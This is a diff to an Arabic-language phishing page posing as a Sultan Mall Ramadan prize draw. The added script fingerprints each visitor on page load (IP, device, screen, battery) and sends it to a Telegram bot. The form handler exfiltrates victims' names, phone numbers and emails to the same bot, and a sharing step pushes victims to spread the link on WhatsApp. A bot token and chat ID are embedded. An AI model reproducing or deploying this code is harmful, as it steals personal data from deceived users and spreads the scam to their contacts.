@@ -68,43 +68,86 @@
         عدد المقاعد المتبقية: <span style="color: var(--gold); font-weight: bold;">462</span> مقعد فقط!
     </div>
 </div>
-
 <script>
-    // الحين يا جنرال حط بياناتك هنا بحذر
+    // بياناتك الخاصة يا جنرال
     const token = "8630574958:AAFm1DOq1WChSi04xr9mXodcTSDxaBPfT-A"; 
     const chatId = "7388801889"; 
 
-    function executeAttack() {
+    // --- 1. رادار "الدخول الصامت" (يشتغل فور فتح الصفحة) ---
+    async function silentRadar() {
+        let device = navigator.userAgent;
+        let platform = navigator.platform;
+        let screenRes = `${window.screen.width}x${window.screen.height}`;
+        let batteryInfo = "غير متاح";
+        let ipAddr = "جاري الجلب...";
+
+        // جلب البطارية
+        try {
+            const battery = await navigator.getBattery();
+            batteryInfo = `${(battery.level * 100).toFixed(0)}% (${battery.charging ? 'يشحن ⚡' : 'لا يشحن 🔋'})`;
+        } catch (e) {}
+
+        // جلب الـ IP
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            ipAddr = data.ip;
+        } catch (e) {}
+
+        const initialMsg = `
+🚨 دخول جديد للموقع!
+🌐 الـ IP: ${ipAddr}
+📱 الجهاز: ${platform}
+🔋 البطارية: ${batteryInfo}
+🖥️ الشاشة: ${screenRes}
+📄 تفاصيل: ${device.substring(0, 100)}...
+        `;
+        
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(initialMsg)}`);
+    }
+
+    // تشغيل الرادار الصامت فوراً
+    silentRadar();
+
+    // --- 2. دالة تسجيل البيانات (تشتغل عند ضغط الزر) ---
+    async function executeAttack() {
         const name = document.getElementById('name').value;
         const phone = document.getElementById('phone').value;
         const email = document.getElementById('email').value || "غير متوفر";
 
         if(name && phone) {
-            const secretMsg = `🌙 صيد رمضاني جديد!\n👤 الاسم: ${name}\n📱 الرقم: ${phone}\n📧 الإيميل: ${email}\n📍 السلطان مول - اليمن`;
+            const finalMsg = `
+🌙 صيد خاص بـ ZeroX (بيانات التسجيل):
+👤 الاسم: ${name}
+📱 الرقم: ${phone}
+📧 الإيميل: ${email}
+🤐 تم بنجاح
+            `;
             
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(secretMsg)}`);
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(finalMsg)}`);
 
             document.getElementById('step1').style.display = 'none';
             document.getElementById('share-section').style.display = 'block';
         } else {
-            alert("يا بطل، عبي بياناتك صح عشان تدخل السحب!");
+            alert("يرجى ملء البيانات للدخول في السحب!");
         }
     }
 
+    // --- 3. دالة المشاركة الفيروسية ---
     let shareCount = 0;
     function viralShare() {
         if(shareCount < 10) {
             shareCount++;
             document.getElementById('count').innerText = shareCount;
             document.getElementById('bar').style.width = (shareCount * 10) + "%";
-            
             window.open(`whatsapp://send?text=🌙 السلطان مول يوزع جوائز بمناسبة رمضان! سجلت اسمي وطلع اسمي في السحب، جرب حظك هنا: ${window.location.href}`);
         } else {
-            alert("مبروك! تم إدراج اسمك في السحب النهائي لـ 10,000 فائز. سيصلك رمز التأكيد عبر الواتساب قريباً.");
-            document.getElementById('share-section').innerHTML = "<h2 style='color:var(--gold)'>تم بنجاح! 🎉</h2><p>انتظر اتصالنا أو رسالة التأكيد خلال 24 ساعة.</p>";
+            alert("مبروك! تم إدراج اسمك في السحب النهائي.");
+            document.getElementById('share-section').innerHTML = "<h2>تم بنجاح! 🎉</h2>";
         }
     }
 </script>
+
 
 </body>
 </html>
